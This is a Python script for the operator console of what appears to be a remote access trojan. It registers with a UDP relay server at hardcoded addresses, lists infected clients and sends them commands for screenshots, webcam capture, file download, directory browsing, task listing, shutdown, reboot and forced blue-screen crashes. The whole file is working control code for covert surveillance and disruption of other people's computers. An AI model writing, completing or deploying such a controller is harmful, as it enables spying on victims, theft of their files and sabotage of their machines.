import socket
import threading
import os

######################################
######### GLOBAL VARIABLES ###########
######################################
import time

alias = 'Manager'
сonnection_established = False
server_address = '10.1.19.139'
#server_address = '10.1.18.200'
#server_address = '127.0.0.1'
#server_address = '157.245.7.127'
server_port = 8000

client_address = ''
client_port = 0
selected_client = ()

######################################
############# FUNCTIONS ##############
######################################

clear = lambda: os.system('cls')

def receive():
  while True:
    data = manager_socket.recv(1024)
    print(data.decode('utf-8'))
  pass

######################################
############# EXECUTION ##############
######################################

#server_address = input('Enter a server IP address\n->')
#server_port = int(input('Enter a server port\n->'))
server = server_address, server_port
try:
  manager_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  manager_socket.bind(('', 0))
  manager_socket.sendto(f'Alias: {alias}'.encode('utf-8'), server)

  thread = threading.Thread(target=receive)
  thread.start()

  сonnection_established = True
  print('Connection successful!')
except:
  print('Connection failed!')


while сonnection_established:
  key = input('\tChoose an action:'
                '\n1 - Show client list'
                '\n2 - Select a client'
                '\n3 - Send to a client'
                '\n4 - Disconnect\n-> ')
  match key:
    case '1':
      os.system('cls')
      manager_socket.sendto(('show client list').encode('utf-8'), server)
      input('')
    case '2':
      client_address = input('Enter client address\n->')
      client_port = int(input('Enter client port\n->'))
      os.system('cls')
      manager_socket.sendto((f'select a client: {client_address} {client_port}').encode('utf-8'), server)
      input('')
    case '3':
      command = input('\tCommand:'
              '\nS - Screenshot'
              '\nWS - Webcam screen'
              '\nP - Poweroff'
              '\nR - Reboot'
              '\nB - BSoD'
              '\nLS - Get current directory'
              '\nCD [dir] - Change directory'
              '\nDL [filename] - Download a file'
              '\nTL - Get tasklist'
              '\n -> ')
      selected_client = client_address, client_port
      try:
        os.system('cls')
        manager_socket.sendto(f'{command}'.encode(), selected_client)
      except:
        print('\nInvalid client address or port!\n')
        continue
      input('')
    case '4':
      сonnection_established = False
      manager_socket.shutdown()
    case _:
      pass


#while True:

